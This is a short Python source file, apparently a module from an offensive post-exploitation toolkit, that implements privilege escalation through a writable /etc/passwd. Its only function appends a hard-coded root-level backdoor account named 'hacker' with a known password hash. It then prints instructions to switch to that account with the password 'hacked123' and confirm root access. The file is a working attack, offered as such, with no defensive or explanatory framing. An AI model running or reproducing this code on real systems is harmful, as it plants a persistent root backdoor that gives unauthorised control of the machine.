from .abc import Command
import subprocess

class PasswdPrivesc(Command):
    """Privilege escalation via writable /etc/passwd"""

    def do_command(self, lines: str, *args):
        results = []

        backdoor_entry = "hacker:$1$Hpxs2PR1$OzMXP.OV9v1hulAGGQOe00:0:0:root:/root:/bin/sh\n"

        try:
            with open("/etc/passwd", "a") as f:
                f.write(backdoor_entry)
            results.append("[+] Backdoor user added to /etc/passwd")
            results.append("[*] Run: su hacker (password: hacked123)")
            results.append("[*] Then run whoami to confirm root")
        except Exception as e:
            results.append(f"[-] Failed: {e}")

        return "\n".join(results)